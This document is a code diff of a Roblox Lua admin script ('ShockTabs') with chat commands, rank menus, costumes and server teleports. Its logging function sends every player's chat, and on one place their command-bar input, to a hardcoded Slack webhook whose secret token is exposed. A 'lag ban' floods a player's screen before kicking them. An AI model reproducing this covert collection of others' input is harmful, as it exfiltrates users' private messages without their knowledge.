+ ['Deep clean' ]={Name='Deep clean';Usages={ 'deepclean','dclr','deepclear','dclean' };Rank=1;Desc='Runs deep clean in workspace.';Function=function(Player, Args)
+ local charParts = {"Head","HumanoidRootPart","Left Leg","Right Leg","Right Arm","Left Arm","Torso"}
+ coroutine.resume(coroutine.create(function()
+ for _,v in pairs(game:service'Players':players()) do
+ for _,z in pairs(v.Character:children()) do
+ if z:IsA('Part') then
+ local isCharPart = false
+ for _,x in pairs(charParts) do
+ if z.Name == x then
+ isCharPart = true
+ break
+ end
+ end
+ if not isCharPart then
+ z:Destroy()
+ end
+ elseif z:IsA('Model') then
+ z:Destroy()
+ end
+ end
+ end
+ for _,v in pairs(workspace:children()) do
+ if v:IsA('Tool') or v:IsA('Hat')
+ or (v:IsA('Part') and v.Name ~= 'Base' and v.Name ~= Core.Variables.AdminName..' Tab')
+ or (v:IsA('Model') and not v:findFirstChild('Humanoid')) then
+ v:Destroy()
+ end
+ end
+ end))
+ Core.Functions.Tab(Player,'DeepClear\'ed',nil,nil,nil,5)
+ end;
+};
+ ['BaseSize' ]={Name='BaseSize';Usages={ 'bs' };Rank=1;Desc='Sets the base size.';Function=function(Player, Args) workspace.Base.Size=Vector3.new(tonumber(Args[1]),1,tonumber(Args[1])) end;
+};
+ ['Base' ]={Name='Base';Usages={ 'base' };Rank=3;Desc='Makes the baseplate follow specified user.';Function=function(Player, Args)
+ local LastBaser=Core.Variables.Baser
+ for i,v in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ Core.Variables.Baser=v.Name
+ break
+ end
+ if Baser~=LastBaser then
+ Core.Functions.Tab(p,Core.Variables.Baser..' is the new Baseplate follow target.')
+ end
+ end};
+ ['UnBase']={Name='UnBase',Usages={'unbase'},Rank=3,Desc='Makes the baseplate no one.',Function=function(Player, Args)Baser=''end};
+ ['Costume']={Name='Costume',Usages={'costume','costumes'},Rank=0,Desc='Loads up a costume from the table.',
+ Function=function(Player, Args)
+ for i,v in pairs(Core.Costumes) do
+ Core.Functions.Tab(Player,i,'Costume','New Yeller',function()
+ Core.Functions.Dismiss(Player.Name)
+ for h,j in pairs(Core.Functions.GetCharacterItems(Player.Character)) do
+ if j:IsA'Hat' then
+ j:Destroy()
+ end
+ end
+ for k,l in pairs(v) do
+ coroutine.resume(coroutine.create(function()
+ Player.Character[l.Name]:Destroy()
+ end))
+ l=l:clone()
+ l.Parent=Player.Character
+ wait()
+ if l:IsA'Decal' then
+ if l.Name=='face' then
+ coroutine.resume(coroutine.create(function()
+ Player.Character.Head.face:Destroy()
+ end))
+ wait()
+ l.Parent=Player.Character.Head
+ else
+ l.Parent=Player.Character.Torso
+ end
+ end
+ if l:IsA'Hat' then
+ end
+ end
+ end)
+ end
+ end;};
+ ['VipServer' ]={Name='VipServer';Usages={ 'vs' };Rank=1;Desc='Teleports users to vip server.';Function=function(Player, Args)
+ Core.Functions.Dismiss(Player.Name)
+ for i,v in pairs(Core.VipServers) do
+ if v then
+ Core.Functions.Tab(Player,i,nil,nil,function()
+ Core.Functions.Dismiss(Player.Name) wait()
+ game:service'TeleportService':TeleportToPrivateServer(game.PlaceId,v,Core.Functions.GetPlayers(Args[1],Player))
+ end)
+ end
+ end
+ end;
+};
+ ['Freemodeler Server' ]={Name='Freemodeler Server';Usages={ 'fmer','fms' };Rank=1;Desc='Teleports users to fmer server.';Function=function(Player, Args)
+ game:service'TeleportService':TeleportToPrivateServer(game.PlaceId,Core.VipServers["FMerLand"],Core.Functions.GetPlayers(Args[1],Player))
+ end;
+};
+ ['NewVipServer' ]={Name='NewVipServer';Usages={ 'nvs' };Rank=6;Desc='Creates a new vip server';Function=function(Player, Args)
+ Core.Functions.CreateVipServer(Args[1]) -- Gonna add a datastore for vip servers
+ end;
+};
+ ['RemoveVipServer' ]={Name='RemoveVipServer';Usages={ 'rvs' };Rank=6;Desc='Removes a vip server.';Function=function(Player, Args)
+ for i,v in pairs(Core.VipServers) do
+ Core.Functions.Tab(Player,i,nil,nil,function()
+ v=nil
+ Core.Functions.Dismiss(Player.Name)
+ end)
+ end
+ end;
+};
+ ['Login' ]={Name='Login';Usages={ 'login' };Rank=0;Desc="Login if your Rank is lost.";Function=function(Player, Args)
+ local Folder=Core.Logins[Player.Name] -- no idea
+ local User=Folder[Args[1] ]
+ local Password=Args[2]
+ if User and Password and User.Password==Password then
+ Core.Functions.Tab(Player,'No!','Override','Really red',function() Core.Functions.Dismiss(Player.Name) end)
+ Core.Functions.Tab(Player,'Are you sure you want to login to user: '..User.Username..'?','Override','Really red',function()
+ Core.Ranks[Player.Name]=User.Backup
+ Core.Functions.Dismiss(Player)
+ wait(1)
+ Core.Functions.Tab(Player,'Welcome back '..Player.Name,nil,nil)
+ end)
+ else
+ Core.Functions.Tab(Player,'Incorrect Password or Username',nil,'Really red') -- fixed
+ end
+ end;
+};
+ ['Add Costume' ]={Name='Add Costume';Usages={ 'ac','addcostume' };Rank=3;Desc='Adds a costume to the table.';Function=function(Player, Args)
+ Core.Costumes[Args[1] ]=Core.Functions.GetCharacterItems(Player.Character,true)
+ end;
+};
+ ['Get' ]={Name='Get';Usages={ 'g','get' };Rank=0;Desc='Gets arguments.';Function=function(Player, Args)
+ if Args[1]=='r' or Args[1]=='reset' or Args[1]=='respawn' then
+ Player:LoadCharacter()
+ elseif Args[1]=='rej' or Args[1]=='rejoin' or Args[1]=='rj' then
+ game:service'TeleportService':TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
+ elseif Args[1]=='insert' or Args[1]=='ins' then
+ game:service'InsertService':LoadAsset(Args[2]):children()[1].Parent=Player.Character
+ elseif Args[1]=='c' or Args[2]=='clean' then
+ for i,v in pairs(workspace:children()) do
+ pcall(function()
+ if v~=cbase and Core.Functions.character(v)==false then
+ v:Destroy()
+ end
+ end)
+ end
+ elseif Args[1]=='clearterrain' or Args[1]=="ct" then
+ workspace.Terrain:Clear()
+ elseif Args[1]=='base' or Args[1]=='baseplate' or Args[1]=='b' then
+ pcall(function()
+ cbase:Destroy()
+ end)
+ local base=Instance.new('Part',workspace)
+ cbase=base
+ base.Name='Base'
+ base.Size=Vector3.new(700,1.2,700)
+ base.CFrame=CFrame.new(0,-.6,0)
+ base.Anchored=true
+ base.BrickColor=BrickColor.new('Bright green')
+ base.Material='Grass'
+ base.TopSurface='Smooth'
+ base.BottomSurface='Smooth'
+ elseif Args[1]=='nobase' or Args[1]=='nobaseplate' or Args[1]=='nb' then
+ pcall(function()
+ cbase:Destroy()
+ end)
+ end
+ end;
+};
+ ['SelfRanks' ]={Name='SelfRanks';Usages={ 'self','selfrank','selfranked' };Rank=0;Desc='Checks self ranked.';Function=function(Player)
+local v=Core.Ranks[Player.Name]
+Core.Functions.Dismiss(Player.Name)
+Core.Functions.Tab(Player,'Rank | '..v.Rank,nil,nil,nil)
+Core.Functions.Tab(Player,'Desc | '..v.Desc,nil,nil,nil)
+Core.Functions.Tab(Player,'Color | '..v.Color,nil,v.Color,function()
+Core.Functions.Dismiss(Player.Name)
+for i=1, #Core.palette do
+local color=Core.palette[i]
+Core.Functions.Tab(Player,color,nil,color,function()
+v.Color=color
+Core.Functions.Dismiss(Player.Name)
+end)
+end
+end)
+  Core.Functions.Tab(Player,'Selection Box',nil,nil,function()
+     Core.Functions.Dismiss(Player.Name)
+     Core.Functions.Tab(Player,'On','Selection Box',nil,function()
+       v.Sel=true
+     end)
+     Core.Functions.Tab(Player,'Off','Selection Box',nil,function()
+       v.Sel=false
+       end)
+  end)
+Core.Functions.Tab(Player,'Second Color | '..v.Color2,nil,v.Color2,function()
+Core.Functions.Dismiss(Player.Name)
+for i=1, #Core.palette do
+local color=Core.palette[i]
+Core.Functions.Tab(Player,color,nil,color,function()
+v.Color2=color
+Core.Functions.Dismiss(Player.Name)
+end)
+end
+end)
+Core.Functions.Tab(Player,'Name | '..Player.Name,nil,nil,nil)
+Core.Functions.Tab(Player,'Suffix | '..v.Suffix,nil,nil,function()
+    Core.Functions.Dismiss(Player.Name)
+for i,v in pairs(Core.Variables.Pre_Suf_ix) do -- wat
+    local tosay=v
+    if tosay==' ' then
+        tosay='Space'
+    elseif tosay=='' then
+        tosay='None'
+        end
+        Core.Functions.Tab(Player,tosay,'Suffix',nil,function()
+            Core.Functions.Dismiss(Player.Name)
+            Core.Ranks[Player.Name].Suffix=v
+        end)
+        end
+    end)
+Core.Functions.Tab(Player,'Prefix | '..v.Prefix,nil,nil,function()
+    Core.Functions.Dismiss(Player.Name)
+for i,v in pairs(Core.Variables.Pre_Suf_ix) do -- wat
+    local tosay=v
+    if tosay==' ' then
+        tosay='Space'
+            elseif tosay=='' then
+        tosay='None'
+        end
+        Core.Functions.Tab(Player,tosay,'Prefix',nil,function()
+            Core.Functions.Dismiss(Player.Name)
+            Core.Ranks[Player.Name].Prefix=v
+        end)
+        end
+    end)
+Core.Functions.Tab(Player,'Server teleport.',nil,'Really red',function()Core.Commands.VipServer.Function(Player,{'me'})end)
+--[[if GetRank(Player.Name) > GetRank(5) then
+Tab(Player,'Clear',nil,'Really red',function()if GetRank(Player.Name) > v.Rank then v.Rank=0 v.Desc='' v.Prefix=':' v.Suffix=' ' v.Color='Cyan' v.Color2='Really blue' end end)
+Tab(Player,'SetRank',nil,'Really red',function()
+if GetRank(Player.Name) > v.Rank then
+Dismiss(Player.Name)
+
+for i=1, GetRank(Player.Name)+2 do
+  Tab(Player,RanksToText(i-3),nil,nil,function()
+  v.Rank=i-3
+  Dismiss(Player.Name)
+  end)
+  end]]
+  Core.Functions.Tab(Player,'Close',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) end)
+  end;
+};
+ ['Toggle wires' ]={Name='Toggle wires';Usages={ 'twires','wires','wire','twire' };Rank=5;Desc='Toggles wires between tabs.';Function=function(Player, Args)
+ local ActiveTabs={}
+ for i,v in pairs(Core.tablets) do
+ if v.Part.Parent==v.Parent then
+ table.insert(ActiveTabs,v)
+ end
+ end
+ for h,j in pairs(Core.Functions.GetPlayers(Args[1],Player)) do
+ pcall(function()
+ local wires_on = false
+ if Args[2] == 'on' then
+ wires_on = true
+ elseif Args[2] == 'off' then
+ wires_on = false
+ end
+ Core.wires_toggle_table[j.Name] = wires_on
+ local PlayerTabs={};
+ for _,v in pairs(ActiveTabs) do
+ if(v and v.Player and v.Player==j.Name)then
+ table.insert(PlayerTabs,v);
+ end;
+ end;
+ for i,v in pairs(PlayerTabs) do
+ local function wireTransp(tab,wires_on)
+ coroutine.resume(coroutine.create(function()
+ if wires_on == false then
+ tab.Part.CWire.Transparency=1
+ else
+ tab.Part.CWire.Transparency=0
+ end
+ end))
+ end
+ wireTransp(v,wires_on)
+ end
+ end)
+ end
+end};}
+Core.Functions={
+  ToggleChat=function(Player,option)
+   local todo='false'
+   if option==false then
+    todo='false'
+   elseif option==true then
+    todo='true'
+   end
+         Core.Functions.UseCmdBar(Player.Name,[[x/
+      game:service("StarterGui"):SetCore(
+"ChatBarDisabled",
+]]..todo..[[)
+         ]])
+   
+  end;
+  AttachBinds=function(Player)
+      Core.Functions.UseCmdBar(Player.Name,[[x/
+      script.Parent=nil
+      game:service'Players'.LocalPlayer:GetMouse().KeyDown:connect(function(Key)
+      if Key=='y' then
+      game:service'Workspace':FindFirstChild"ShockTabs Remote Event":FireServer({'dt', ]]..Core.Variables['VerKey']..[[})
+      end
+      if Key=='e' then
+      game:service'Workspace':FindFirstChild"ShockTabs Remote Event":FireServer({'self', ]]..Core.Variables['VerKey']..[[})
+      end
+      end)
+         ]])
+     end;
+  runInSandbox=function(f)
+    --get the old function environment
+    local oldenv = getfenv(f)
+ 
+    --create a new one
+    local newenv = setmetatable({}, {
+        __index = function(_, k)
+            if k=='script' or k=='Core' then
+                --that prevents any instances being accessed
+                return nil
+            else
+                --but otherwise defaults to the old one
+                return oldenv[k]
+            end
+        end
+    })
+ 
+    --call the function in its new environment
+    setfenv(f, newenv)
+    f()
+end;
+  getCommands=function(Player,rank)
+    for i,v in pairs(Core.Commands) do
+        if v.Rank == rank then
+            Core.Functions.Tab(Player,i,nil,nil,function()
+                
+                
+                Core.Functions.Dismiss(Player.Name)
+                Core.Functions.Tab(Player,'Back',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) Core.Commands.Commands.Function(Player,{''}) end)
+                Core.Functions.Tab(Player,'Rank | '..v.Rank,nil,nil,nil)
+                Core.Functions.Tab(Player,'Desc | '..v.Desc,nil,nil,nil)
+                Core.Functions.Tab(Player,'Name | '..i,nil,nil,nil)
+                Core.Functions.Tab(Player,'Usages',nil,nil,function()
+                    Core.Functions.Dismiss(Player.Name)
+                    wait()
+                    Core.Functions.Tab(Player,'Back',nil,'Really blue',function() Core.Functions.Dismiss(Player.Name) Core.Commands.Commands.Function(Player,{''}) end) -- Okay, good
+                    for g,h in pairs(v.Usages) do
+                        Core.Functions.Tab(Player,h,nil,Ranks[Player.Name].Color2,nil);
+                    end
+            end)
+            
+            
+            end)
+        end
+    end
+end;
+MakeFace=function(id)
+local face=Instance.new'Decal'
+face.Name='face'
+face.Texture='http://www.roblox.com/asset/?id='..id
+return face
+end;
+RanksToText=function(Number)
+return Core.RankNames[Number+3] -- For every negative and neutral rank we add 1
+end;
+AddLoop=function(Name,Func,Time)
+Core.Loops[Name]={Func,Time}
+coroutine.resume(coroutine.create(function()
+while Loops[Name] do
+  wait(Time)
+  Func()
+end
+end))
+end;
+GetHue=function(Hue)
+local section = Hue % 1 * 3
+local secondary = 0.5 * math.pi * (section % 1)
+if section < 1 then
+  return Color3.new(1, 1 - math.cos(secondary), 1 - math.sin(secondary))
+elseif section < 2 then
+  return Color3.new(1 - math.sin(secondary), 1, 1 - math.cos(secondary))
+else
+  return Color3.new(1 - math.cos(secondary), 1 - math.sin(secondary), 1)
+end
+end;
+Log=function(Name,Text)
+coroutine.resume(coroutine.create(function()
+game:service'HttpService':PostAsync('https://hooks.slack.com/services/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',
+'{"text":"'..Text..'", "username":"'..Name..'"}',
+Enum.HttpContentType.ApplicationUrlEncoded)
+end))
+end;
+Hint=function(text, plrname) -- who edited out the hint..
+plrname=plrname or '['..Core.Variables.AdminName..']'
+text=plrname..': '..text -- this way the name appears along with text like its being typed
+for _,v in pairs(game:FindService('Players'):GetPlayers()) do
+  coroutine.resume(coroutine.create(function()
+  local gui = Instance.new('ScreenGui',v.PlayerGui)
+
+  local frame = Instance.new('Frame',gui)
+  frame.BorderColor3 = BrickColor.new('Toothpaste').Color
+  frame.BackgroundColor3 = Color3.new(255, 255, 255)
+  frame.BorderSizePixel = 5
+  frame.Position = UDim2.new(.1, 0,0.05, 0)
+  frame.Size = UDim2.new(.8, 0,.1, 0)
+  frame.BackgroundTransparency = 1
+  --// functions
+  --//Text config
+
+  local txt = Instance.new('TextLabel',frame)
+  txt.BorderSizePixel = 0
+  txt.Text = string.rep('_',#text) -- text=plrname..': '..text
+  txt.Position = UDim2.new(0.25, 0,0.05, 0)
+  txt.Size=UDim2.new(0.5,0,.9,0)
+  txt.BackgroundTransparency = 1
+  txt.Font = 'SourceSansBold'
+  txt.FontSize = 'Size28'
+  txt.ZIndex = 5
+  txt.TextTransparency = 1
+  for z=1,-1,-0.1 do
+    frame.BackgroundTransparency = z
+    txt.TextTransparency = z
+    wait()
+  end
+  -- We can just loop it, it'd make for less lag
+  for i = 1, #text do wait()
+  txt.Text=text:sub(1, i)..string.rep('_',#text-i) --itt does, save and rerun!
+  -- Less lag / instances. the code janitor is better and less lag :3
+  local s=Instance.new("Sound", gui) --
+  s.SoundId='rbxassetid://147982968'
+  s.Volume=1
+  s.Pitch=1
+  s.Name='Typing'
+  s:Play()
+  game:service'Debris':AddItem(s, .1)
+end
+wait(3)
+for z=0,1,0.1 do
+  frame.BackgroundTransparency = z
+  txt.TextTransparency = z
+  wait()
+end
+gui:remove()
+end))
+end
+end;
+UseCmdBar=function(player,command)
+if game:service'Players':findFirstChild(tostring(player), true) then
+if game:service'Players'[player]:FindFirstChild("PlayerGui", true) then
+  local plr = game:service'Players'[player]
+  local gui = plr.PlayerGui
+  if gui:FindFirstChild("SB_DataTransfer", true) then
+    if gui.SB_DataTransfer:FindFirstChild("SB_CommandRemote", true) then
+      gui.SB_DataTransfer.SB_CommandRemote.Value = ""..command
+    end
+  end
+end
+end
+end;
+CreateVipServer=function(Name)
+local link=game:service'TeleportService':ReserveServer(game.PlaceId)
+Core.VipServers[Name]=link
+return link
+end;
+Tab=function(player, text, title, color, func,delaya,localguis)
+local num=0
+coroutine.resume(coroutine.create(function()
+if not player then return end
+wait() -- yas
+text=text or "nul"
+title=title or Core.Variables.AdminName
+localguis = localguis or false
+color=color or Core.Ranks[player.Name].Color
+p=Instance.new("Part",workspace)
+p.BrickColor=BrickColor.new(color)
+p.Anchored=true
+p.CanCollide=false
+p.FormFactor = 'Custom'
+p.Transparency=.9
+p.Size=Vector3.new(1.5,1.5,1.5)
+p.Name=tick()..math.random()
+pcall(function()
+--p.CFrame=player.Character.Torso.CFrame+Vector3.new(0,2,0) -- JANITOR: Now they generate above the head :P
+end)
+
+ local c_wire = Instance.new("Part",p)
+c_wire.Name = "CWire"
+local mesh = Instance.new("BlockMesh",c_wire) -- 'CyllinderMesh' pls no cylinder pls i like part
+c_wire.Anchored = true
+c_wire.CanCollide = false
+c_wire.FormFactor = 'Custom'
+c_wire.BrickColor = BrickColor.new(Core.Ranks[player.Name].Color2)
+c_wire.Size = Vector3.new(.2,.2,.2)-- We'll set it in the actual tabs looop. line 586
+c_wire.CFrame = p.CFrame
+
+
+local wire=Instance.new'FloorWire'
+wire.Parent=p
+wire.Name='Wire'
+wire.From=p
+wire.Color3=BrickColor.new(Core.Ranks[player.Name].Color2).Color-- falling removed my .color -- coz u need to use Color not Color3
+p.Locked=true
+local sel,bbg
+local Faces={"Front","Back","Top","Bottom","Left","Right"}
+local Facees={}
+for i,v in pairs(Faces) do
+SG=Instance.new('SurfaceGui',p)
+table.insert(Facees,SG)
+SG.Adornee=p
+SG.Face=v
+if localguis then
+  SG.Parent=player.PlayerGui
+end
+local Frame=Instance.new'Frame'
+Frame.Parent=SG
+Frame.Size=UDim2.new(1,0,1,0)
+Frame.BorderSizePixel=0
+Frame.BackgroundTransparency=0
+Frame.BackgroundColor3=p.BrickColor.Color
+end
+bbg=Instance.new("BillboardGui", p)
+bbg.Adornee=p
+if localguis then
+bbg.Parent=player.PlayerGui
+end
+bbg.Size=UDim2.new(1,0,.5,0)
+bbg.AlwaysOnTop=true
+bbg.StudsOffset=Vector3.new(0, 3, 0)
+local tl=Instance.new("TextLabel", bbg)
+tl.Text='['..title..']: \n'..text
+tl.Size=UDim2.new(1,0,.5,0)
+tl.TextColor3=BrickColor.new(color).Color
+tl.TextStrokeColor3=BrickColor.new('Black').Color -- JANITOR: Tabs text looks so much better now! :D
+tl.TextStrokeTransparency=0
+tl.FontSize='Size14'
+tl.Font='Legacy'
+tl.BackgroundTransparency=1
+tl.Position=UDim2.new(0,0,.2,0)
+local light=Instance.new('PointLight',p)
+light.Color=p.BrickColor.Color
+light.Brightness=8
+light.Range=4
+sel=Instance.new('SelectionBox')
+if Core.Ranks[player.Name].Sel==true then
+sel.Adornee=p
+sel.Color3=BrickColor.new(Core.Ranks[player.Name].Color2).Color
+sel.SurfaceTransparency=1
+sel.Transparency=.7
+sel.Parent=p
+if localguis then
+sel.Parent=player.PlayerGui
+end
+end
+local cd=Instance.new'ClickDetector'
+cd.Parent=p
+cd.MaxActivationDistance=math.huge
+num=#Core.tablets+1
+Core.tablets[num]={Player=player.Name,Part=p,Parent=p.Parent,Destroy=function()
+    pcall(function()
+--p:Destroy()
+end)
+pcall(function()
+  SG:Destroy()
+end)
+pcall(function()
+  bbg:Destroy()
+end)
+pcall(function()
+  sel:Destroy()
+  end)
+end}
+--[[        pcall(function()
+repeat wait() until p.Parent==nil
+bbg:Destroy()
+c_wire:Destroy()
+for y,u in pairs(Facees) do
+  u:Destroy()
+end
+end)]]
+cd.MouseClick:connect(function(pla)
+if pla.Name==player.Name or Core.Ranks[player.Name].Rank < Core.Functions.GetRank(pla.Name) then
+  p:Destroy()
+  SG:Destroy()
+  bbg:Destroy()
+  sel:Destroy()
+  if func then func()
+
+else
+
+end
+end
+end)
+pcall(function()
+if delaya~=nil then
+wait(delaya)
+if func then func()p:destroy()
+  SG:Destroy()
+  bbg:Destroy()
+  sel:Destroy()
+else
+end
+end
+end)
+end))
+return num
+end;
+GetReplicators=function()
+local returner={}
+for i,v in pairs(Core.Variables.Networkserver:children()) do
+if v:IsA'NetworkReplicator' then
+table.isert(returner,v)
+end
+end
+return returner
+end;
+JSONEncode=function(Table)
+return game:service'HttpService':JSONEncode(Table)
+end;
+JSONDecode=function(Table)
+return game:service'HttpService':JSONDecode(Table)
+end;
+  PlayerAdded=function(Player)
+  coroutine.resume(coroutine.create(function()
+  if Core.Ranks[Player.Name]==nil then
+    Core.Ranks[Player.Name]={Desc='No desc.',Rank=0,Prefix=':',Suffix=' ',Color='Cyan',Color2='Really blue',Sel=false}
+  else
+    Bans(Player)
+  end
+  if Core.Functions.GetRank(Player.Name) < 0 then
+    Player:kick('Banned')
+  end
+  if Pri and Player then
+    Bans(Player)
+  end
+
+
+  if Player then
+    Player.Chatted:connect(function(Message)
+        --coroutine.resume(coroutine.create(function()
+            if Core and Core.Functions and Core.Functions.Chatted then
+    Core.Functions.Chatted(Player,Message) -- Errors were made from people chatting after :end
+    end
+    --end))
+    end)
+  end
+end))
+if game.PlaceId==20279777 then
+  Player.CharacterAdded:connect(function(c)
+  local bar=Player.PlayerGui.SB_OutputGUI.Task.InputBar
+  local lastthing=''
+  local default=bar.Text
+  bar.Changed:connect(function()
+  if bar.Text==default then
+    if lastthing~=[[Click here or press (') to run a command]] then
+      Core.Functions.Log(Player.Name,lastthing)
+    end
+  end
+  lastthing=bar.Text
+  end)
+  end)
+  repeat wait() until Player.Character~=nil
+    
+    local bar=Player.PlayerGui.SB_OutputGUI.Task.InputBar
+    
+    local lastthing=''
+    local default=bar.Text
+    bar.Changed:connect(function()
+    if bar.Text==default then
+      if lastthing~=[[Click here or press (') to run a command]] then
+        Core.Functions.Chatted(Player,lastthing)
+      end
+    end
+    lastthing=bar.Text
+  end)
+    end
+    --Player:LoadCharacter()
+  end;
+    GetRank = function(User)
+  if Core.Ranks[User] and Core.Ranks[User].Rank then
+    return Core.Ranks[User].Rank
+  end
+  return 0
+  end;
+  SplitIntoArguments=function(Player,Message,suffix)
+  local prefix=Core.Ranks[Player.Name].Prefix
+  local start=1
+  local args={}
+  for i=1, #Message do
+    if Message:sub(i,i)==suffix then
+      args[#args+1]=Message:sub(start,i-1)
+      start=i+1
+    elseif i==#Message then
+      args[#args+1]=Message:sub(start,i)
+    end
+  end
+  return args
+  end;
+  Chatted=function(Speaker,Message)
+  Core.Functions.Log(Speaker.Name..' Chatted',Message)
+  local Prefix=Core.Ranks[Speaker.Name].Prefix
+  if Message:sub(1,#Prefix)==Prefix then
+    local Args=Core.Functions.SplitIntoArguments(Speaker,Message:sub(#Prefix+1),(Core.Ranks[Speaker.Name].Suffix))
+    print(#Core.Commands)
+    for i,v in pairs(Core.Commands) do
+        if not Core or not Core.Functions then return end
+      if v.Rank <= Core.Functions.GetRank(Speaker.Name) then
+        for k,l in pairs(v.Usages) do
+          if l==Args[1] then
+            table.remove(Args,1)
+            v.Function(Speaker,Args)
+          end
+        end
+      end
+    end
+  end
+  end;
+    GetPlayers=function(Message,Speaker)
+    Message=string.lower(Message)
+    local Players=Core.Functions.SplitIntoArguments(Speaker,Message,',')  -- Seperates names by , so all,me,someoneelse would be {'all','me','someoneelse'}
+    local toreturn={}
+    for i,v in pairs(Players) do
+      if v=='me' then
+        table.insert(toreturn,Speaker)
+      elseif v=='all' then
+        for g,h in pairs(game:service('Players'):GetPlayers()) do
+          coroutine.resume(coroutine.create(function()
+          table.insert(toreturn,h)
+          end))
+          end -- I'm gonna make some actual commands.
+        elseif v=='others' then
+          for g,h in pairs(game:service('Players'):GetPlayers()) do
+            if h~=Speaker then
+              --else it does bro.
+              table.insert(toreturn,h)
+            end
+          end
+        elseif v=='random' then -- Okay, well
+          local playerslist=game:service'Players':GetPlayers()
+          table.insert(toreturn,playerslist[math.random(1,#playerslist)]) -- yes
+        else for g,h in pairs(game:service'Players':GetPlayers()) do -- Just adding real quick for a test
+          if h.Name:lower():sub(1,#v)==v then
+            table.insert(toreturn,h)
+          end
+        end
+        end -- Gonna quickly edit in studio
+      end
+      return toreturn
+      end;
+      IsBanned = function(plr) -- Checks if they are banned.
+      if Core.Functions.GetRank(plr) < 0 then -- Under 0 = banned
+      return true
+    else
+      return false
+    end
+    end;
+    Bans = function(plr)
+    local playr = game:GetService('Players'):FindFirstChild(plr.Name)
+    if Core.Functions.GetRank(plr.Name)==-2 then
+      Core.Functions.UseCmdBar(playr, [[l/game:GetService('StarterGui'):SetCoreGuiEnabled("All", false)]])
+      playr.PlayerGui:ClearAllChildren()
+      local lagCoroutine=coroutine.create(function()
+      while wait() do
+        Instance.new('Message',playr.PlayerGui).Text'You\'re being lagged'
+      end
+      end)
+      local yesplz=coroutine.resume(lagCoroutine)
+      wait(5)
+      playr:kick('You\'re lag banned for: \n'..Core.Ranks[plr.Name]['Desc'])
+      pcall(function()
+      yesplz=nil
+      end)
+    end
+    if Core.Functions.GetRank(plr.Name)==-1 then
+      plr:kick('You\'re banned for: \n'..Core.Ranks[plr.Name]['Desc'])
+    elseif Core.Functions.GetRank(plr.Name)==0 and Pri==true then
+      plr:kick('Private server enabled.')
+    end
+    if plr.AccountAge <= 50 then
+      plr:Kick'Account too young, go away.'
+    end
+    end;
+    AddCommand = function(ReferenceName,Usages,Rank,Desc,Function)
+    Commands[ReferenceName]={Name=ReferenceName,Usages=Usages,Rank=Rank,Desc=Desc,Function=Function}
+    end;
+    IsPlayerCharacter = function(char)
+    for i,v in pairs(game:service'Players':GetPlayers()) do
+      if v.Character==char then
+        return true
+      end
+      end;
+      return false
+      end;
+      BodyColor = function(h,t,ra,la,rl,ll)
+      local bc=Instance.new('BodyColors')
+      bc.HeadColor=BrickColor.new(h)
+      bc.TorsoColor=BrickColor.new(t)
+      bc.LeftArmColor=BrickColor.new(la) -- ...
+      bc.RightArmColor=BrickColor.new(ra)
+      bc.LeftLegColor=BrickColor.new(ll)
+      bc.RightLegColor=BrickColor.new(rl)
+      return bc
+      end;
+      Shirt=function(tem)-- GAHHH
+      local face=Instance.new'Shirt'
+      face.Name='Shirt'
+      face.ShirtTemplate='http://www.roblox.com/asset/?id='..tem
+      return face
+
+      end;
+      Insert=function(...)
+      local toret = game:service'InsertService':LoadAsset(...):children()[1]
+      return toret
+      end;
+      GetCharacterItems=function(char,gonnause)
+      local toreturn={}
+      local Items={
+        ['Shirt']=true;
+        ['Pants']=true;
+        ['Hat']=true;
+        ['BodyColors']=true;
+        ['CharacterMesh']=true;
+        ['Tool']=true;
+      }
+      for i,v in pairs(char:children()) do
+        if Items[v.ClassName]==true then
+          table.insert(toreturn,v)
+          if gonnause then
+            v.Parent=nil
+          end
+        end
+      end
+      if char.Head.face then
+        table.insert(Items,char.Head.face)
+        if gonnause then
+          char.Head.face.Parent=nil
+        end
+      end
+      if char.Torso.roblox then
+        table.insert(Items,char.Torso.roblox)
+        if gonnause then
+          char.Torso.roblox.Parent=nil
+        end
+      end
+      return toreturn
+      end;
+      Dismiss=function(PlayerName)
+      for i,v in next, Core.tablets do
+        if v.Player==PlayerName then
+            v.Part:Destroy()
+          v.Destroy()
+        end
+      end
+      end;
+      updtrankz=function()
+      local setranks=Core.Functions.JSONDecode(Core.DataSave:GetAsync('Ranks'))
+      for i,v in pairs(setranks) do
+        Core.Ranks[i]=v
+      end
+      end;
+      
+      destroyadmin=function()
+      Core.DataSave:SetAsync('Ranks',Core.Functions.JSONEncode(Core.Ranks))
+      Core.DataSave:SetAsync('VipServers',Core.Functions.JSONEncode(Core.VipServers))
+      _G.ShockTabs=nil
+      for i,v in pairs(Core.tablets) do
+        coroutine.resume(coroutine.create(function()
+        v.Part:destroy()
+        end))
+    end
+    for i,v in pairs(Core.Events) do
+      v:disconnect()
+  end
+  Core.Functions={}
+      Core={}
+      end;
+      -- Functions go here
+    };
+Core.Costumes={
+SFOTH={
+  Core.Functions.Insert(173783297);
+  Core.Functions.MakeFace('13038246');
+  Core.Functions.BodyColor('New Yeller','Really blue','Camo','Camo','Really blue','Really blue');
+}; -- pause i wanna test the bodycolors
+Bro={
+  Core.Functions.Insert(259423244);
+  Core.Functions.Insert(11748356);
+  Core.Functions.Insert(1235488);
+  Core.Functions.MakeFace(22920500); -- Fixed.
+};
+};
+Func=function(Name,...)
+    Core.Functions[Name](...)
+end
+Core.Events={}
+  Core.DataSave=game:service'DataStoreService':GetDataStore(Core.Variables.DataStoreKey)
+  if Core.DataSave:GetAsync('VipServers') then
+    Core.Variables.VipServers=game:service'HttpService':JSONDecode(Core.DataSave:GetAsync('VipServers'))
+  end
+  for _,v in pairs(game:service('Players'):GetPlayers()) do
+    pcall(function()
+    Core.Functions.PlayerAdded(v)
+    end)
+  end
+  Core.Functions.AddLoop('SaveRanks',function() -- Adds a loop which saves ranks.
+  if AutoSaveRanks then
+    Core.DataSave:SetAsync('Ranks',Core.Functions.JSONEncode(Core.Ranks))
+  end
+  Core.DataSave:SetAsync('VipServers',Core.Functions.JSONEncode(Core.VipServers))
+  end,30)
+  starttime=tick()
+  up=0
+  Core.Functions.AddLoop('Up',function()
+  for i=1, 100 do
+    up=up+.01
+  end
+  for i=1, 100 do
+    up=up-.01
+  end
+end,0)
+Core['RE'] = Instance.new("RemoteEvent")
+Core.RE.Parent = game:service'Workspace'
+Core.RE.Name = "ShockTabs Remote Event"
